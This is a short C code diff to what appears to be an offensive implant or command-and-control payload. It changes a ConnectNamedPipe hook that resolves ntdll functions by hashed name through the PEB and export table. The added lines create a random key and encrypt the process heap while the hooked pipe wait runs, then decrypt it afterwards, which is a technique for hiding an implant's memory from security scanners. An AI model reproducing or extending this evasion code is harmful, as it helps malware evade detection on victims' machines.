@@ -48,6 +48,8 @@ D_SEC( D ) BOOL WINAPI ConnectNamedPipe_Hook( _In_ HANDLE hNamedPipe, _Inout_ LP
 	API			Api;
 	IO_STATUS_BLOCK		Isb;
 
+	BYTE			Key[ 16 ];
+
 	BOOLEAN			Ret = TRUE;
 	NTSTATUS		Nst = STATUS_UNSUCCESSFUL;
 
@@ -58,6 +60,10 @@ D_SEC( D ) BOOL WINAPI ConnectNamedPipe_Hook( _In_ HANDLE hNamedPipe, _Inout_ LP
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
 	RtlSecureZeroMemory( &Isb, sizeof( Isb ) );
+	RtlSecureZeroMemory( &Key, sizeof( Key ) );
+
+	/* Random key generation */
+	RandomString( &Key, sizeof( Key ) );
 
 	Api.NtWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
 	Api.RtlNtStatusToDosError = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLNTSTATUSTODOSERROR );
@@ -65,6 +71,9 @@ D_SEC( D ) BOOL WINAPI ConnectNamedPipe_Hook( _In_ HANDLE hNamedPipe, _Inout_ LP
 	Api.NtFsControlFile       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTFSCONTROLFILE );
 	Api.RtlAllocateHeap       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
 	Api.RtlFreeHeap           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
+
+	/* Encrypt the heap */
+	HeapEncryptDecrypt( &Key, sizeof( Key ) );
 
 	if ( lpOverlapped != NULL ) 
 	{
@@ -150,6 +159,9 @@ D_SEC( D ) BOOL WINAPI ConnectNamedPipe_Hook( _In_ HANDLE hNamedPipe, _Inout_ LP
 			Ret = FALSE;
 		};
 	};
+
+	/* Decrypt the heap */
+	HeapEncryptDecrypt( &Key, sizeof( Key ) );
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
